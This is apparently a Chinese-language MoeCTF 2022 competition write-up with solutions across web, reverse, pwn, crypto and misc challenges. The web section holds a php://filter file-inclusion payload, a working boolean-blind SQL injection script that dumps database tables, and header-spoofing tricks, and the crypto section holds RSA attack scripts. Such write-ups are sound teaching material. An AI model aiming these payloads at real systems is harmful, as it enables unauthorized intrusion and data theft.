# MoeCTF 2022

## Web

### baby\_file

#### 题目

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
?>
```

#### 解题

这题是简单的文件包含，先用 dirsearch 扫描一下。

```bash
$ python dirsearch.py -u http://node2.anna.nssctf.cn:28169/
```

可以扫描到 `/flag.php` ，通过构造以下 Payload

```url
file=php://filter/read=convert.base64-encode/resource=flag.php
```

可以获得到 `flag.php` 的源码

```php
<?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;
NSSCTF{b3333432-7dff-4ca8-b6f4-cd4bd5fc6688};
?>
```

### ezhtml

通过 `右键 - 查看网页源代码` 寻找答案没有结果，发现底下有个 `evil.js` ，访问该文件可以得到 flag 力！

### what are y0u uploading？

随便提交一个图片可以得到以下回显

```html
文件上传成功！filename：fea5445634569c851f2933f11259cc92.png
我不想要这个特洛伊文件，给我一个f1ag.php 我就给你flag!
```

通过修改 Request 中的 `filename` 为 `f1ag.php` 即可得到 flag 了。

<figure><img src=".gitbook/assets/what_are_y0u_uploading？-1.png" alt=""><figcaption></figcaption></figure>

### ezphp

先来分析源码\~

```php
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';

// $_GET['flag'] 和 $_POST['flag'] 至少存在一个
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}

// $_GET['flag'] 和 $_POST['flag'] 至少一个值为 flag
if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}

//将 value 的值赋给 $key
foreach ($_POST as $key => $value) {
    $$key = $value;
}

//将 $value 的值赋给 $key
foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>
```

分析结束后，通过构造以下 Payload

```
test=flag&flag=test
```

就可以获得到 flag 了，原理是先将 test 的值复制 flag 的值，又因为必须存在一个 `$_GET['flag'] === 'flag'` ，因此将 flag 的值改为 test 的值就可以了。

### Sqlmap\_boy

查看网站源代码可以发现

```html
<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
```

通过访问 `http://node2.anna.nssctf.cn:28497/login.php` 回显

```json
{
	code: "0",
	message: "用户名或密码错误"
}
```

应该可以推断为布尔注入，通过编写以下代码

```python
import time
import requests

url = 'http://node2.anna.nssctf.cn:28497/login.php'
session = requests.Session()
def getDatabase():
    results = []
    for i in range(1000):
        print(f'{i}...')
        start = -1
        end = 255
        mid = -1
        while start < end:
            mid = (start + end) // 2
            params = {"username": f'admin" and (ascii(substr(database(),{i+1},1))>{mid})#'}
            ret = session.post(url, data=params)
            if '"code":"1"' in ret.text:
                start = mid + 1
            else:
                end = mid
            time.sleep(0.05)
        if mid == -1:
            break
        results.append(chr(start))
        print(''.join(results))
    return ''.join(results)

begin = time.time()
getDatabase()
print(f'time spend: {time.time() - begin}')
```

可以得到数据库名为 `moectf` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="moectf" limit 0,1),{i+1},1))>{mid})#'}
```

可以得到数据库表 `articles,flag,users` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema="moectf" and table_name="flag"),{i+1},1))>{mid})#'}
```

可以得到列名 `flAg` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select flAg from flag limit 0, 1),{i+1},1))>{mid})#'}
```

就可以得到 flag 力！

### cookiehead

题目包含 cookie ，那就是 Cookies 里面一探究竟！

首先打开题目后到达第一关 `仅限本地访问` ，用 HackBar 添加 Header

```http
X-Forwarded-For: 127.0.0.1
```

之后提示 `请先登录` ，将 Cookies 修改成 `login=1` 即可。

最后一关 `You are not from http://127.0.0.1/index.php !` 则添加 Header

```http
Referer: http://127.0.0.1/index.php
```

就可以得到 flag 啦！

### God\_of\_aim

右键查看源代码可以得到提示

```html
<!-- 你知道吗？index.js实例化了一个aimTrainer对象-->
```

可以在 `aimtrainer.js` 文件中发现 `checkflag1()` 和 `checkflag2()` 函数，在 Console 输入 `_0x78bd` 可以得到回显

```js
['aimTrainerEl', 'aim-trainer', 'getElementById', 'scoreEl', 'score', 'aimscore', 'delay', 'targetSize', 'aimscoreEL', 'setScore', 'start', 'innerHTML', 'setAimScore', 'position', 'style', 'relative', 'timer', 'createTarget', 'checkflag1', 'checkflag2', 'stop', 'moectf{Oh_you_can_a1m_', '你已经学会瞄准了！试试看:', 'start2', 'and_H4ck_Javascript}', '']
```

就可以得到 flag `moectf{Oh_you_can_a1m_and_H4ck_Javascript}` 了！

## Reverse

### Reverse入门指北

flag 就在指北最底下，好耶，是指北！

### checkin

使用 IDA 打开后就可以发现 flag 力！

### Hex

使用 010 Editor 打开 `Hex.exe` 后搜索 `moectf` 可以发现 flag

<figure><img src=".gitbook/assets/Hex-1.png" alt=""><figcaption></figcaption></figure>

### Base

使用 IDA 打开后对着 `main` F5 就可以发现 base64 加密内容

```
1wX/yRrA4RfR2wj72Qv52x3L5qa=
```

并且在 `main` 中还可以发现一个符号表

```
abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

通过 CyberChef 一把梭可以得到 flag `moectf{qwqbase_qwq}`

### begin

使用 IDA 打开后对着 `main` F5 就可以发现

```c
for ( i = 0; i < strlen(Str); ++i )
    Str[i] ^= 0x19u;
if ( !strcmp(Str, Str2) )
    puts("\nGood job!!! You know how to decode my flag by xor!");
else
    puts("\nQwQ. Something wrong. Please try again. >_<");
```

通过分析以上代码可以发现需要对每个字符与 `0x19` 进行异或运算，若和 `Str2` 比对完全一致则弹出正确，通过双击也可以发现 `Str2` 的内容。

<figure><img src=".gitbook/assets/Base-1.png" alt=""><figcaption></figcaption></figure>

整理内容可以得到一个数组

```python
arr = [0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B,
       0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D,
       0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38,
       0x38, 0x38, 0x38, 0x64]
```

编写 Python 代码对数组内容进行异或运算并且转为字符就可以得到 flag 了。

```python
arr = [0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B,
       0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D,
       0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38,
       0x38, 0x38, 0x38, 0x64]

flag = ''
for ch in arr:
    flag += chr(ch ^ 0x19)
print(flag)

# moectf{X0r_1s_s0_int3r3sting!!!!!}
```

## Pwn

### shell

```bash
$ nc node3.anna.nssctf.cn 28646
Welcome to PWN world!
In PWN, your goal is to get shell.
Here I'll give you the shell as a gift for our first meeting.
Have fun in the following trip!
cat flag
NSSCTF{765b5608-08aa-4876-b917-05a4129cf665}
```

## Crypto

### vigenere

https://www.guballa.de/vigenere-solver

```
6. i won't tell you that the flag is moectf attacking the vigenere cipher is interesting
```

解码后就可以得到 flag `moectf{attacking_the_vigenere_cipher_is_interesting}` 了

### 0rsa0

#### 第一关

打开文件后可以看到 `e1=3` ，可以使用低加密指数攻击。

```python
from Crypto.Util.number import *
from gmpy2 import iroot

c = 1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n = 133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707

i = 0
while 1:
    if iroot(c + i * n, 3)[1] == 1:
        m = iroot(c + i * n, 3)[0]
        print(long_to_bytes(m))
        break
    i = i + 1
```

通过低加密指数攻击可以得到明文 `T8uus_23jkjw_asr`

#### 第二关

可以发现存在 dp 泄露，因此可以通过泄露的 dp 进行攻击。

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import *

e = 65537
n = 159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
dp = 947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
c = 37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306

for i in range(1, e):
    if (dp * e - 1) % i == 0:
        if n % (((dp * e - 1) // i) + 1) == 0:
            p = ((dp * e - 1) // i) + 1
            q = n // (((dp * e - 1) // i) + 1)
            phi = (q - 1) * (p - 1)
            d = invert(e, phi)
            m = pow(c, d, n)
            print(long_to_bytes(m))
            break
```

通过 dp 泄露攻击可以得到明文 `_3d32awd!5f&#@sd`

所以 flag 就是 `moectf{T8uus_23jkjw_asr_3d32awd!5f&#@sd}`

### Signin

这道题的 phi 与 e 并不互素，尝试用 `gmpy2.invert(e, q - 1)` 不行，用 `d = gmpy2.invert(e, p - 1)` 可以。

```python
import gmpy2
from Crypto.Util.number import *

e = 65537
p = 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073
q = 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379
c = 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595
phi = (q - 1) * (p - 1)
d = gmpy2.invert(e, p - 1)
n = p * q

m = pow(c, d, p)

print(long_to_bytes(m))
# moectf{Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!}
```

### 一次就好

根据题目文件可以看出两个素数是相近的，并且明文是经过异或运算的

```python
import gmpy2
from Crypto.Util.strxor import strxor
from Crypto.Util.number import *

n = 164395171965189899201846744244839588935095288852148507114700855000512464673975991783671493756953831066569435489213778701866548078207835105414442567008315975881952023037557292470005621852113709605286462434049311321175270134326956812936961821511753256992797013020030263567313257339785161436188882721736453384403
e = 0x10001
gift = 127749242340004016446001520961422059381052911692861305057396462507126566256652316418648339729479729456613704261614569202080544183416817827900318057127539938899577580150210279291202882125162360563285794285643498788533366420857232908632854569967831654923280152015070999912426044356353393293132914925252494215314
c = b'Just once,I will accompany you to see the world'

temp = gmpy2.iroot(n, 2)[0]
p = gmpy2.next_prime(temp)
q = n // p
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = gmpy2.powmod(gift, d, n)
key = long_to_bytes(m)
flag = strxor(key, c)
print(flag)
# moectf{W0w_y02_k5ow_w6at_1s_one_t1m3_pa7}
```

### smooth

根据文件中的 `get_vulnerable_prime()` 函数可以得出 p-1 是光滑数，

* 光滑数 (Smooth number)：指可以分解为小素数乘积的正整数

通过费马小定理和 Pollard's p-1 算法就可以分解 n 了。

```python
def smooth(N):
    a = 2
    n = 2
    while True:
        a = powmod(a, n, N)
        res = gcd(a - 1, N)
        if res != 1 and res != N:
            return res
        n += 1
```

第二关则考的是 Wilson 定理，即 `(p - 1)! ≡ 1﹡(p - 1) ≡ -1 (mod p)` 。因为题目已经将 flag 乘以 1 到 P - 1729 (不包含 P - 1729) 取模，因此我们需要继续乘以 P - 1729 到 P - 1 ，这样就可以使用 Wilson 定理来求出真正的 flag 了。

现在的 flag 就是 `flag * (p - 1)!≡ -1 * flag (mod p)` ，因此将 flag 取反取模就可以得到真正的 flag 了。

完整代码如下

```python
from gmpy2 import *
from Crypto.Util.number import *

n = 0xdc77f076092cbe81c44789ccfc1b2ca55eabae65f44cf34382799e8bbb42d4d6c032bd897c21df1da401929d82deb56264823a757f6cacf63e0037146026cbab32ab9e4abc783dcabaac2b7ccc439937be3ab0fbf149524ff29ef0fe6f27e45215d74b40597c70e8207159dc7f542c2a6828500016480053dfc2d8dbf8fcdf6700640184c8f3318f7aab2e17e116edf680592f5eae951159bb8c20cfbd0cbab8b4b95925b5068038d0377a55a4d346ebbf53a1c2943b7c17e1b9d4a1b77916da2e15140b05b96655906942a07d04b7e25fa7521b3b7ae26eda68375a8b8ef2d5b4704a28168b236de97f24a663f0d0a3aeab47767dfe75a21662f5f25ef7f7d4b25c90fd7bcdd7137c23f03b6ea4209f8fb9b4628355e6ad62e6467d26666d3d1b0e6f078c5f3866413a6fcd3c1dc2ff3a5ab286e339d5c72f4d2f0473a4faddcba6b031bb6ec226fd4b319834b5029f09ea0ffeb5b6ed182d5a13675571b6708c38299118043390343e2f79edebd2ae0e0a765a3aebf776f54ca983cdae8547547cfc8430f7222aefa77301d7cc7c03b1451b6603028b21fea869d35138a9c83919985a91b3fdfa934f25a442cc10349b0ed6f2ee3955d40249e8b3fb9f1955534ee06cee41a3ad2d6ff7dbdb0f01e47b9e4d04f65232f5579135ae035e8ba2d1fe6465a730dcc8b9ba3a558ab38f040ea510757d25e92f886c50c24ad967f1
e = 0x10001
c = 0x3cc51d09c48948e2485820f6758fb10c7693c236acc527ad563ba8369c50a0bc3f650f39a871ee7ef127950ed916c5f4dc69894e11caf9d178cd7e8f9bf9af77e1c69384cc5444da64022b45636eeb5b7a221792880dd242be2bb99be3ed02c430c2b77d4912bec1619d664e066680910317c2bb0c87fafdf25f0a2400103278f557b8eca51d3b67d61098f1ab68da072bb2810596180afbc81a840cd24efef4d4113235160e725a5af4824dc716d758b3bc792f2458e979398e001b27e44d21682e2ef80ae94e21cd09a12e522ca2e569df72f012fa40341645445c6e68c6233a8a39e5b91eb14b1ccfa61c9bad25e8e3285a22da27cd506ddd63f207517a4e8ede00b104d8806ff4c0e3162c3de69169d7e584952655272b96d39d242bb83019c7eab1ceb0b4b287591e1e0a5b6378e70340a82d3430c5925d215f31fda6d9d0bccea240591b22a3d0f6b5bf4ddf1243d71aca0fd53045c352c8c5497ebcdbd7ac11083d63aba7c053604fda2430c317a4e04702b5ad539e110f101165b21dcd9fdb5ba7324acdba6a506244ce7c911197dfe067441fe7488d164c050f45ef6476aaf399cedde1793cceb8c21d88ec8ecf5e17df27586713d7dd9566ec5023cfef75422b73e2d5a932c661b3cfdf9c4bda12b64380d2be1aa957c3e1416e068937bafe79b8cf303296792388e9c197702e11e7ded6088ae992d352b23a4a27


def smooth(N):
    a = 2
    n = 2
    while True:
        a = powmod(a, n, N)
        res = gcd(a - 1, N)
        if res != 1 and res != N:
            return res
        n += 1


p = smooth(n)
q = n // p
phi = (p - 1) * (q - 1)
d = invert(e, phi)
m = pow(c, d, n)

for i in range(p-1729, p):
    m = m * i % p
m = (-m) % p
print(long_to_bytes(m))
# moectf{Charming_primes!_But_Sm0oth_p-1_1s_vu1nerab1e!}
```

### 入门指北

运行参考答案即可获得 flag ，好耶！是指北！

moectf{Welc0me\_t0\_fascinating\_crypto\_w0rld}

### MiniMiniBackPack

> https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/

#### 题目脚本

```python
from gmpy2 import *
from Crypto.Util.number import *
import random
from FLAG import flag

def gen_key(size):
    s = 1000
    key = []
    for _ in range(size):
        a = random.randint(s + 1, 2 * s)
        assert a > sum(key)
        key.append(a)
        s += a
    return key


m = bytes_to_long(flag)
L = len(bin(m)[2:])
key = gen_key(L)
c = 0

for i in range(L):
    c += key[i]**(m&1)
    m >>= 1

print(key)
print(c)
```

#### 解题

通过分析题目脚本可知 flag 转成了二进制后，通过 `gen_key()` 函数来生成一个 key 数组，并且通过 `assert a > sum(key)` 使得 key 数组中的所有之和比 a 小，这也说明这是一个超递增序列。

之后就是从 m 的后 i 位开始从后往前与 1 进行与运算，并且将其的值作为 key\[i] 的指数，若 m 的后 i 位为 1 则 c 在原基础上加 key\[i]，反之则加 1。

解题将 key 数组倒序即可获得正序的 flag ，解题过程将上诉加密过程逆序即可。

```python
from Crypto.Util.number import *

txt = open('附件.txt').readlines()
key = eval(txt[0])
key = key[::-1]
c = 2396891354790728703114360139080949406724802115971958909288237002299944566663978116795388053104330363637753770349706301118152757502162
m = ''

for i in key:
    if c - i > 0:
        c -= i
        m += '1'
    else:
        c -= 1
        m += '0'

m = int(m, 2)
print(long_to_bytes(m))
# moectf{Co#gRa7u1at1o^s_yOu_c6n_d3c0de_1t}
```

## Misc

### Misc指北

文档末尾存在摩斯电码，内容如下

```
.-- . .-.. ..--- --- -- . ..--.- ....- --- ..--.- -- .. ...-- -.-. ..--.- .---- ..- -.-. -.- -.-- -.-.--
```

用 CyberChef 一把梭可以得到 flag `moectf{WEL2OME_4O_MI3C_1UCKY!}`

### nyanyanya

用 StegSolve 查看图片可以发现 Red plane 3 有文字。

<figure><img src=".gitbook/assets/nyanyanya-1.png" alt=""><figcaption></figcaption></figure>

用 Data Extract 设置 Red plane 0、Green plane 0、Blue plane 0，可以发现 flag 就出来了

<figure><img src=".gitbook/assets/nyanyanya-2.png" alt=""><figcaption></figcaption></figure>

### cccrrc

> crc32 爆破脚本 https://github.com/theonlypwner/crc32

看标题猜测是 压缩包crc爆破（

点击打开压缩包可以看到压缩后大小都是 16，满足爆破条件

```bash
$ python crc32.py reverse 0x67b2d3df
4 bytes: {0x6d, 0x6f, 0x65, 0x63}
verification checksum: 0x67b2d3df (OK)
alternative: 8tLtKb (OK)
alternative: 9USU97 (OK)
alternative: BbaPOC (OK)
alternative: Jhw3Ck (OK)
alternative: K9Tc4n (OK)
alternative: SSKsHA (OK)
alternative: TJLMbj (OK)
alternative: bmRitF (OK)
alternative: e9xj3e (OK)
alternative: lbMYHH (OK)
alternative: txn817 (OK)
alternative: v4WWmz (OK)
$ python crc32.py reverse 0x628abed2
4 bytes: {0x74, 0x66, 0x7b, 0x71}
verification checksum: 0x628abed2 (OK)
alternative: 1bMsCU (OK)
alternative: 4GOS0c (OK)
alternative: 5fPrB6 (OK)
alternative: BbxYQQ (OK)
alternative: Cb9hJH (OK)
alternative: FfeXP2 (OK)
alternative: Lmgim_ (OK)
alternative: NQbw4B (OK)
alternative: SSRzVS (OK)
alternative: X4bWtc (OK)
alternative: dhB3Zr (OK)
alternative: fiVak7 (OK)
alternative: hfIQW9 (OK)
alternative: lbTPVZ (OK)
$ python crc32.py reverse 0x6b073427
4 bytes: {0x77, 0x71, 0x5f, 0x63}
verification checksum: 0x6b073427 (OK)
alternative: 1bNdgG (OK)
alternative: 7gG7Wa (OK)
alternative: 8tVjqb (OK)
alternative: Ii8NS7 (OK)
alternative: SSQmrA (OK)
alternative: TJVSXj (OK)
alternative: ZEIcdd (OK)
alternative: bmHwNF (OK)
alternative: etOIdm (OK)
alternative: lbWGrH (OK)
alternative: tEejco (OK)
alternative: v4MIWz (OK)
alternative: zJzZ_a (OK)
$ python crc32.py reverse 0x08c8da10
4 bytes: {0x72, 0x63, 0x21, 0x7d}
verification checksum: 0x08c8da10 (OK)
alternative: 4GIVjo (OK)
alternative: IHcLDe (OK)
alternative: K9Kopp (OK)
alternative: KU8Bt4 (OK)
alternative: Lmal7S (OK)
alternative: NQdrnN (OK)
alternative: QoQaUB (OK)
alternative: WjX2ed (OK)
alternative: XyIoCg (OK)
alternative: YXVN12 (OK)
alternative: bmMe0X (OK)
alternative: gHOECn (OK)
alternative: j69gPl (OK)
alternative: k6xVKu (OK)
alternative: vyefDl (OK)
alternative: wXzG69 (OK)
alternative: xvzVxb (OK)
```

将得到的 16 个字节(6d6f656374667b7177715f637263217d) 转换为字符串(moectf{qwq\_crc!}) flag 就出来咯！

### zip套娃

拿到压缩包后打开压缩包发现没有压缩包密码的踪迹，那就只能用 Archpr 狠狠的爆破了（悲

Archpr 尝试 1 至 6 位数字爆破可以得到密码是 1235 ，解压后可以得到 `fl.zip` 和一个提示 `密码的前七位貌似是1234567 后三位被wuliao吃了` 。

那就通过掩码暴力破解，设置掩码为 `1234567???` 进行爆破可以得到密码 `1234567qwq` ，解压后得到 `fla.zip` 和一个一摸一样的提示，继续使用掩码破解发现无效，用 010 Editor 查看 `fla.zip` 可以发现文件数据区的全局加密为 `00` 而文件目录区的全局方式位标记却是 `01` ，说明这个 zip 文件为伪加密文件。

修复方式就是把 `01` 改成 `00` 即可。

<figure><img src=".gitbook/assets/zip套娃-1.png" alt=""><figcaption></figcaption></figure>

解压后就可以得到 flag `moectf{!zip_qwq_ZIP}`

### usb

> http://www.manongjc.com/detail/25-cxtkhbqgdxkwlwz.html

将下载下来的文件丢到 kali 用 Wireshark 打开，可以看到基本都是 HID Data ，那就将 HID Data 的数据提取出来。

```bash
$ tshark -r usb.pcapng -T fields -e usbhid.data  > usbdata.txt
```

读取后通过引用中的脚本进行解码就可以得到 flag `moectf{Learned_a6ou7_USB_tr@ffic}` ，完整代码如下

```python
import re

normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",
              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",
              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",
              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",
              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",
              "30": "]", "31": "\\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",
              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F", "0a": "G", "0b": "H", "0c": "I",
             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O", "13": "P", "14": "Q", "15": "R",
             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y", "1d": "Z", "1e": "!",
             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",
             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "_", "2e": "+", "2f": "{",
             "30": "}", "31": "|", "32": "<NON>", "33": "\"", "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?",
             "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
             "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
output = []

txt = open('usbdata.txt', 'r')

for line in txt:
    line = line.strip('\n')
    if len(line) == 16:
        line_list = re.findall('.{2}', line)
        line = ":".join(line_list)
        try:
            if line[0] != '0' or (line[1] != '0' and line[1] != '2') or line[3] != '0' or line[4] != '0' or line[
                9] != '0' or line[10] != '0' or line[12] != '0' or line[13] != '0' or line[15] != '0' or line[
                16] != '0' or line[18] != '0' or line[19] != '0' or line[21] != '0' or line[22] != '0' or line[
                                                                                                          6:8] == "00":
                continue
            if line[6:8] in normalKeys.keys():
                output += [[normalKeys[line[6:8]]], [shiftKeys[line[6:8]]]][line[1] == '2']
            else:
                output += ['[unknown]']
        except:
            pass

txt.close()

flag = 0
print("".join(output))
for i in range(len(output)):
    try:
        a = output.index('<DEL>')
        del output[a]
        del output[a - 1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i] == "<CAP>":
            flag += 1
            output.pop(i)
            if flag == 2:
                flag = 0
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass
print('output :' + "".join(output))
# moectf{<CAP>l<CAP>earnee<DEL>d_a6ou7_<CAP>usb<CAP>_tr@ffic}
# output :moectf{Learned_a6ou7_USB_tr@ffic}
```

### Locked\_bass

题目描述 `这锁虚挂着的，能踹` 提示压缩包应该是伪加密，通过 010 Editor 打开后将两个 `09 00` 修改为 `00 00` 即可修复并解压获得 `Unlocked bass.zip` 。

<figure><img src=".gitbook/assets/Locked_bass-1.png" alt=""><figcaption></figcaption></figure>

在 `Unlocked bass.zip` 内可以发现 `Unlocked bass.txt` ，里面包含一串 base64 编码内容。

```
bW9lY3Rme04wd190aDFzX2k0X2FfYkBzc19VX2Nhbl91M2VfdG9fcGxhOX0=
```

使用 CyberChef 一把梭就可以得到 flag `moectf{N0w_th1s_i4_a_b@ss_U_can_u3e_to_pla9}`

### what\_do\_you\_recognize\_me\_by

把文件拖入 010 Editor 可以明显发现这是 PNG 格式的图片，但是文件头不对，修复文件头为 `89 50 4E 47` 后就能打开图片了。

<figure><img src=".gitbook/assets/what_do_you_recognize_me_by-1.png" alt=""><figcaption></figcaption></figure>

给文件补上后缀名 `.png` 后打开图片是一个二维码

<figure><img src=".gitbook/assets/what_do_you_recognize_me_by-2.png" alt=""><figcaption></figcaption></figure>

使用软件扫码后可以得到 flag `moectf{You_r4c0gnize_%e!}`

### 小纸条

Hint: 全部大写，无分隔

猪圈密码

<figure><img src=".gitbook/assets/小纸条-1.png" alt=""><figcaption></figcaption></figure>

根据上图进行解码可以得到 flag `moectf{ILOVEMYBIGBED}`

### rabbit

用 010 Editor 打开图片可以在末尾发现一串 Rabbit 加密数据

```
U2FsdGVkX1+EPlLmNvaJK4Pe06nW0eLquWsUpdyv3fjXM2PcDBDKlXeKupnnWlFHewFEGmqpGyC1VdX8
```

解密后可以得到 flag `moectf{We1c0m3_t0_moectf_an7_3n7oy_y0urse1f}`
